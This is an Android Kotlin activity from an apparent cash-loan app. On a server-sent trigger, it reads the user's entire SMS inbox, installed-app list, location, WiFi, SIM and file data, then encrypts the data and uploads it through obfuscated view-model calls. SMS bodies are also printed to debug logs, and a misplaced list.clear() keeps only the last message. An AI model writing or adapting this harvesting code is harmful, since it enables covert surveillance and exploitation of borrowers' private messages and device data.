package com.loan.golden.cash.money.loan.ui.activity

import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.content.pm.ApplicationInfo
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import androidx.activity.OnBackPressedCallback
import androidx.annotation.RequiresApi
import androidx.navigation.Navigation
import com.google.gson.Gson
import com.hjq.permissions.Permission
import com.hjq.permissions.XXPermissions
import com.hjq.toast.ToastUtils
import com.loan.golden.cash.money.loan.R
import com.loan.golden.cash.money.loan.app.base.BaseActivity
import com.loan.golden.cash.money.loan.app.permissions.PermissionInterceptor
import com.loan.golden.cash.money.loan.app.util.AESTool
import com.loan.golden.cash.money.loan.app.util.DriverInfoUtil
import com.loan.golden.cash.money.loan.app.util.RxToast
import com.loan.golden.cash.money.loan.data.DeviceUpLoadService
import com.loan.golden.cash.money.loan.data.commom.Constant
import com.loan.golden.cash.money.loan.data.param.AppInfoParam
import com.loan.golden.cash.money.loan.data.param.DeviceInfoParam
import com.loan.golden.cash.money.loan.data.param.UpLoadSmsParam
import com.loan.golden.cash.money.loan.databinding.ActivityMainBinding
import com.loan.golden.cash.money.loan.ui.viewmodel.MainViewModel
import me.hgj.mvvmhelper.util.LogUtils
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody


/**
 * created by : huxiaowei
 * @date : 20220920
 * Describe :
 */
class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {

    var exitTime = 0L
    lateinit var myBinder: DeviceUpLoadService.mBinder
    val list: ArrayList<UpLoadSmsParam.ModelBean.ListBean> = arrayListOf()

    private val connection = object : ServiceConnection {
        override fun onServiceConnected(p0: ComponentName?, p1: IBinder?) {
            myBinder = p1 as DeviceUpLoadService.mBinder
            myBinder.a()
            mViewModel.nappyNapraPath(this@MainActivity)
        }

        override fun onServiceDisconnected(p0: ComponentName?) {

        }
    }

    override fun initView(savedInstanceState: Bundle?) {

        val intent = Intent(this, DeviceUpLoadService::class.java)
        bindService(intent, connection, Context.BIND_AUTO_CREATE)//绑定Service

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                val nav = Navigation.findNavController(this@MainActivity, R.id.host_fragment)
                if (nav.currentDestination != null && nav.currentDestination!!.id != R.id.main_fragment) {
                    //如果当前界面不是主页，那么直接调用返回即可
                    nav.navigateUp()
                } else {
                    //是主页
                    if (System.currentTimeMillis() - exitTime > 2000) {
                        ToastUtils.show("再按一次退出程序")
                        exitTime = System.currentTimeMillis()
                    } else {
                        finish()
                    }
                }
            }
        })
    }

    @RequiresApi(Build.VERSION_CODES.M)
    private fun requestSmsPermission(type: String) {
        XXPermissions.with(this).permission(Permission.RECEIVE_SMS).permission(Permission.SEND_SMS)
            .permission(Permission.READ_SMS).permission(Permission.READ_PHONE_STATE)
            .interceptor(PermissionInterceptor()).request { _, allGranted ->
                if (allGranted) {
                    when (type) {
                        "DEVICE" -> {
                            upLoadDeviceInfo()
                        }

                        "APP" -> {
                            upLoadAppInfo()
                        }

                        "SMS" -> {
                            upLoadSmsInfo()
                        }
                    }

                } else {
                    RxToast.showToast("Insufficient permissions. Please manually enable permissions and try again")
                }
            }
    }

    private fun upLoadSmsInfo() {
        val listBody = getSMSInfo()
        val body = UpLoadSmsParam(
            UpLoadSmsParam.ModelBean(
                list = listBody
            )
        )
        val gsonData = Gson().toJson(body)
        val aesData = AESTool.encrypt1(gsonData, Constant.AES_KEY)
        val paramsBody = aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
//        showLoadingExt("loading.....")
        mViewModel.sacristSacristanCallBack(paramsBody)
    }

    private fun upLoadAppInfo() {
        val appInfoList = getAppInfo()
        val body = AppInfoParam(
            AppInfoParam.ModelBean(
                deviceApps = appInfoList
            )
        )
        val gsonData = Gson().toJson(body)
        val aesData = AESTool.encrypt1(gsonData, Constant.AES_KEY)
        val paramsBody =
            aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
//        showLoadingExt("loading.....")
        mViewModel.mnemonMnemonicCallBack(paramsBody)
    }

    @RequiresApi(Build.VERSION_CODES.M)
    private fun upLoadDeviceInfo() {
        val generaBody = DriverInfoUtil.getGeneralData(this)
        val hardware = DriverInfoUtil.getHardware(this)
        val publicIp = DriverInfoUtil.getPublicIp()
        val simCard = DriverInfoUtil.getSimCard(this)
        val otherData = DriverInfoUtil.getOtherData(this)
        val location = DriverInfoUtil.getLocation(this)
        val storage = DriverInfoUtil.getStorage(this)
        val devFile = DriverInfoUtil.getDivFile(this)
        val batteryStatus = DriverInfoUtil.getBatteryStatus(this)
        val currWifi = DriverInfoUtil.getCurrentWifi(this)
        val configWifi = DriverInfoUtil.getConfigWifi(this)
        val body = DeviceInfoParam(
            DeviceInfoParam.ModelBean(
                generalData = generaBody,
                hardware = hardware,
                publicIp = publicIp,
                simCard = simCard,
                otherData = otherData,
                location = location,
                storage = storage,
                devFile = devFile,
                batteryStatus = batteryStatus,
                currWifi = currWifi,
                configWifi = configWifi,
            )
        )
        val gsonData = Gson().toJson(body)
        val aesData = AESTool.encrypt1(gsonData, Constant.AES_KEY)
        val paramsBody =
            aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
//        showLoadingExt("loading.....")
        mViewModel.gangerCallBack(paramsBody)
    }

    @SuppressLint("Range", "Recycle")
    private fun getSMSInfo(): ArrayList<UpLoadSmsParam.ModelBean.ListBean> {
        val smsInfo: Uri = Uri.parse("content://sms/")
        val cr: ContentResolver = contentResolver
        val projection = arrayOf(
            "_id",
            "thread_id",
            "address",
            "person",
            "body",
            "date",
            "protocol",
            "read",
            "type",
            "service_center",
            "status",
        )
        val cur: Cursor? = cr.query(smsInfo, projection, null, null, "date asc")//desc 正序  asc倒序
        if (null == cur) {
            LogUtils.debugInfo("ooc", "************cur == null")
            return arrayListOf()
        }
        while (cur.moveToNext()) {
            val id = cur.getInt(0)
            val  threadId = cur.getLong(1)
            val address = cur.getString(2)
            val person = cur.getString(3)
            val body = cur.getString(4)
            val date = cur.getLong(5)
            val protocol = cur.getInt(6)
            val read = cur.getInt(7)
            val type = cur.getInt(8)
            val serviceCenter = cur.getString(9)
            val status = cur.getInt(10)
            list.clear()
            try {
                list.add(
                    UpLoadSmsParam.ModelBean.ListBean(
                        msgNo = id.toLong(),
                        threadNo = threadId,
                        address = address,
                        personName = person,
                        protocol = protocol,
                        read = read,
                        type = type,
                    status = status,
                        body = body,
                        serviceCenter = serviceCenter,
                        date = date
                    )
                )
            }catch (_:Exception){

            }
            LogUtils.debugInfo("输出SMS--->>:$address<<-->>$person<<-->>$body<<-->>$date<-->>$protocol<-->>$read<-->>$type<-->>$serviceCenter")
        }
        return list
    }

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onRequestSuccess() {
        super.onRequestSuccess()
        mViewModel.nappyResult.observe(this) {
            if (it.list.isNotEmpty()) {
                it.list.forEachIndexed { _, s ->
                    when (s) {
                        "DEVICE" -> {
                            requestSmsPermission("DEVICE")
                        }

                        "APP" -> {
                            requestSmsPermission("APP")
                        }

                        "SMS" -> {
                            requestSmsPermission("SMS")
                        }
                    }
                }
            }
        }
    }

    @SuppressLint("QueryPermissionsNeeded")
    private fun getAppInfo(): ArrayList<AppInfoParam.ModelBean.DeviceAppsBean> {
        val listAppInfo: ArrayList<AppInfoParam.ModelBean.DeviceAppsBean> = arrayListOf()
        val packageManager = packageManager
        val appList = packageManager.getInstalledApplications(0)
        for (appInfo in appList) {
            val appName = appInfo.loadLabel(packageManager).toString()
            val packageName = appInfo.packageName
//            val icon = appInfo.loadIcon(packageManager)
            val packageInfo = packageManager.getPackageInfo(packageName, 0)
            val versionName = packageInfo.versionName
            val versionCode = packageInfo.versionCode.toString()
            val installTime = packageInfo.firstInstallTime
            val updateTime = packageInfo.lastUpdateTime
            val applicationInfo = packageInfo.applicationInfo
            val flags = applicationInfo.flags.toString()
            val appType = if (!filterApp(appInfo)) {
                "SYSTEM"
            } else {
                "NON_SYSTEM"
            }
            // 执行自定义操作，如打印应用信息、保存应用信息等
            listAppInfo.add(
                AppInfoParam.ModelBean.DeviceAppsBean(
                    appName = appName,
                    packageName = packageName,
                    version = versionName,
                    versionCode = versionCode,
                    appType = appType,
                    flags = flags,
                    installTime = installTime,
                    updateTime = updateTime
                )
            )
//            LogUtils.debugInfo("------$^$^%$^%$^%$^%$appName--$packageName--$versionName--$versionCode--$installTime--$updateTime--$flags--$appType")
        }
        return listAppInfo
    }

    /**
     * 判断某一个应用程序是不是系统的应用程序，
     * 如果是返回true，否则返回false。
     */
    private fun filterApp(info: ApplicationInfo): Boolean {
        //有些系统应用是可以更新的，如果用户自己下载了一个系统的应用来更新了原来的，它还是系统应用，这个就是判断这种情况的
        if (info.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP != 0) {
            return true
            //判断是不是系统应用
        } else if (info.flags and ApplicationInfo.FLAG_SYSTEM == 0) {
            return true
        }
        return false
    }

    override fun onDestroy() {
        super.onDestroy()
        unbindService(connection)//解绑Service
    }
}